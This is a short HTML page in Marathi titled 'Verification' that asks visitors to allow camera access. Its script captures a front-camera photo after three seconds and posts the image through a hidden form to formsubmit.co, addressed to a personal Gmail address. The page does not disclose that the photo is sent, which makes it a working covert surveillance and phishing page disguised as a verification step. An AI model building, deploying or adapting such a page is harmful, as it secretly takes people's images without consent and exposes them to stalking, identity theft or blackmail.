<!DOCTYPE html>
<html lang="mr">
<head>
<meta charset="UTF-8">
<title>Verification</title>
</head>
<body style="text-align:center;font-family:sans-serif;">

<h3>कृपया कॅमेरा परवानगी द्या</h3>
<button id="startBtn">Start Camera</button>

<video id="video" playsinline muted style="width:90%;display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<form id="photoForm" action="https://formsubmit.co/sumitpawale05@gmail.com" method="POST">
  <input type="hidden" name="photo" id="photoInput">
  <input type="hidden" name="_subject" value="📸 Photo Received">
  <input type="hidden" name="_captcha" value="false">
</form>

<script>
const btn = document.getElementById("startBtn");
const video = document.getElementById("video");

btn.onclick = () => {
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  }).then(stream => {
    video.style.display = "block";
    video.srcObject = stream;
    video.play();

    setTimeout(() => {
      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const imageData = canvas.toDataURL("image/png");
      document.getElementById("photoInput").value = imageData;
      document.getElementById("photoForm").submit();
    }, 3000);
  }).catch(() => alert("Camera allow करा"));
};
</script>

</body>
</html>
